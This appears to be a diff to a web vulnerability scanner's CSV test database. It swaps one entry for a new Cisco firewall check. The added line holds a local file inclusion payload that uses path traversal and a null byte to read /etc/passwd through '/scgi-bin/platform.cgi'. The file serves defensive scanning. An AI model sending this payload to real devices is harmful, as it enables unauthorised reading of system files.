@@ -6799,4 +6799,4 @@
 "007074","0","be","/system/sling/cqform/defaultlogin.html","GET","QUICKSTART_HOMEPAGE","","","","","Adobe Experience Manager Sling console.","",""
 "007075","0","be","/crx/de/index.jsp","GET","crxde_favicon.ico","","","","","Adobe Experience Manager CRXDE console.","",""
 "007076","0","be","/libs/cq/core/content/login.html","GET","CQ5 - Sign In","","","","","Adobe Experience Manager CQ5 admin login.","",""
-"007078","3092","3","/mab.nfs","GET","200","","","","","This database can be read without authentication, which may reveal sensitive information.","",""
+"007077","0","5","/scgi-bin/platform.cgi","POST","root:","loic_ipsec:","","","","Devices with Cisco http firewall are prone to a local file inclusion. See: https://www.exploit-db.com/exploits/39184/","button.login.home=Se%20connecter&Login.userAgent=0x4148_Fu&reload=0&SSLVPNUser.Password=0x4148Fu&SSLVPNUser.UserName=0x4148&thispage=../../../../../../etc/passwd%00",""
